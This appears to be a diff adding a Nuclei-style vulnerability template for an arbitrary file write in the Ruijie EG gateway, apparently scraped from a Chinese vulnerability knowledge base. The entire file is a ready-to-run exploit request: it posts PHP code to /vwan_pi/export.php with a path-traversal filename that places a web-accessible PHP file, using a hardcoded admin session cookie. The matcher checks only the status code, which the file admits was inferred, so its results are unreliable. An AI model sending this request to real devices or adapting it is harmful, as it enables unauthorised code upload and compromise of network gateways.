@@ -1,0 +1,39 @@
+id: poc-bd4965540a6ff8018873
+info:
+  name: 锐捷EG易网关export后台任意文件写入
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bd4965540a6ff80188739591ff4b37cb
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bd4965540a6ff80188739591ff4b37cb
+http:
+- raw:
+  - 'POST /vwan_pi/export.php HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
+
+    X-Requested-With: XMLHttpRequest
+
+    Host: {{Hostname}}
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+    Connection: close
+
+    Content-Length: 53
+
+
+    content=<?php phpinfo();?>&filename=../../html/oo.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
